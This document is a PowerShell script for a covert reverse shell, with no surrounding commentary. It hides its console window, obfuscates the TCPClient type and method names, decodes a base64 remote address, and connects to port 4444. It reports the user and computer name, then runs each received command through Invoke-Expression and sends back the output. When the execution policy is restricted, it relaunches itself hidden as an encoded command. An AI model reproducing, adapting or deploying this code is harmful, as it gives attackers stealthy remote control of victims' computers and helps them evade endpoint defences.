# Add this at the VERY beginning to hide the window immediately
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

function Test-ExecutionPolicy {
    $policy = Get-ExecutionPolicy
    if ($policy -eq "Restricted") {
        return $true
    }
    return $false
}

function Get-ObfuscatedTCPClient {
    # Obfuscate IP (already base64 encoded)
    $ip = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("MTU5LjU0Lj="))
    $port = 4444
    
    # Obfuscate "System.Net.Sockets.TCPClient"
    $s1 = "Sy" + "st"
    $s2 = "em"
    $n1 = "N" + "e"
    $n2 = "t"
    $so1 = "So" + "ck"
    $so2 = "et" + "s"
    $t1 = "T" + "C" + "P"
    $t2 = "Cl" + "ie" + "nt"
    
    $tcpType = "$s1$s2.$n1$n2.$so1$so2.$t1$t2"
    
    # Obfuscate method names too
    $getStream = "Get" + "Stream"
    $streamWriter = "Stream" + "Writer"
    $streamReader = "Stream" + "Reader"
    
    try {
        $client = New-Object $tcpType($ip, $port)
        $stream = $client.$getStream()
        $writer = New-Object "$s1$s2.IO.$streamWriter"($stream)
        $reader = New-Object "$s1$s2.IO.$streamReader"($stream)
        
        return @{
            Client = $client
            Stream = $stream
            Writer = $writer
            Reader = $reader
        }
    }
    catch {
        return $null
    }
}

function Start-ReverseShell {
    param($Connection)
    
    $writer = $Connection.Writer
    $reader = $Connection.Reader
    $client = $Connection.Client
    $stream = $Connection.Stream
    
    # Set stream to not timeout
    $stream.ReadTimeout = -1
    $writer.AutoFlush = $true
    
    # Send initial banner (silently)
    $banner = "PowerShell Reverse Shell Connected - " + (Get-Date) + "`n"
    $banner += "User: $env:USERNAME | Computer: $env:COMPUTERNAME`n"
    $banner += "PS " + (Get-Location).Path + "> "
    $writer.Write($banner)
    
    # Main command loop
    while($client.Connected) {
        try {
            # Read command from the server
            $command = $reader.ReadLine()
            
            if ($command -eq $null) {
                break
            }
            
            # Exit conditions
            if ($command -eq "exit" -or $command -eq "quit") {
                break
            }
            
            # Execute command silently
            $output = Invoke-Expression $command 2>&1 | Out-String
            
            # Send output back
            $writer.WriteLine($output)
            $writer.Write("PS " + (Get-Location).Path + "> ")
        }
        catch {
            # Handle errors silently
            if ($client.Connected) {
                $writer.WriteLine("Error executing command: $($_.Exception.Message)")
                $writer.Write("PS " + (Get-Location).Path + "> ")
            }
        }
    }
    
    # Cleanup
    $reader.Close()
    $writer.Close()
    $stream.Close()
    $client.Close()
}

# Main execution with policy handling
if (Test-ExecutionPolicy) {
    # If restricted, re-launch with bypass - HIDDEN
    $scriptContent = Get-Content $MyInvocation.MyCommand.Path -Raw
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptContent))
    
    $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processStartInfo.FileName = "powershell.exe"
    $processStartInfo.Arguments = "-EncodedCommand $encodedCommand"
    $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processStartInfo.CreateNoWindow = $true
    $processStartInfo.UseShellExecute = $false
    
    $process = New-Object System.Diagnostics.Process
    $process.StartInfo = $processStartInfo
    $process.Start() | Out-Null
    $process.WaitForExit()
    
    exit
}

# Normal execution if policy allows - SILENT
try {
    $connection = Get-ObfuscatedTCPClient
    if ($connection) {
        # Completely silent execution - no console output
        Start-ReverseShell -Connection $connection
    }
}
catch {
    # Absolute silent error handling
}
